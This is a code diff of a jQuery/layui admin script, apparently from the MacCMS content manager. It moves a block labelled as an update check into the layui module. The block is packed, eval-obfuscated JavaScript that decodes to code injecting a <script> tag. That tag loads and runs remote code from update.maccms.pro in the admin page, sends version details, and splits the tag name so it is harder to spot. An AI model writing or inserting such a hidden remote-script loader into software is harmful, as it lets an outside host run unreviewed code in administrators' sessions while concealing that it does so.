@@ -11,12 +11,6 @@ String.prototype.replaceAll  = function(s1,s2){
     return this.replace(new RegExp(s1,"gm"),s2);
 }
 
-$(function(){
-    if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' && typeof(THINK_VERSION) !='undefined' ) {
-        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'0\').1(\'<2 3="//4.5.6/7/?c=8&9=\'+a+\'&b=\'+d+\'&e=\'+f+\'&g=\'+h.i()+\'"></j\'+\'k>\');',21,21,'body|append|script|src|update|maccms|pro|v10|check|v|MAC_VERSION|p||PHP_VERSION|tp|THINK_VERSION|t|Math|random|scr|ipt'.split('|'),0,{}));
-    }
-});
-
 layui.define(['element', 'form'], function(exports) {
     var $ = layui.jquery,element = layui.element, layer = layui.layer, form = layui.form;
 
@@ -198,6 +192,13 @@ layui.define(['element', 'form'], function(exports) {
             layer.full(lay);
         }
         return false;
+    });
+
+    // 检查更新
+    $(function(){
+        if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' && typeof(THINK_VERSION) !='undefined' ) {
+            eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'0\').1(\'<2 3="//4.5.6/7/?c=8&9=\'+a+\'&b=\'+d+\'&e=\'+f+\'&g=\'+h.i()+\'"></j\'+\'k>\');',21,21,'body|append|script|src|update|maccms|pro|v10|check|v|MAC_VERSION|p||PHP_VERSION|tp|THINK_VERSION|t|Math|random|scr|ipt'.split('|'),0,{}));
+        }
     });
 
     /* 全选 */
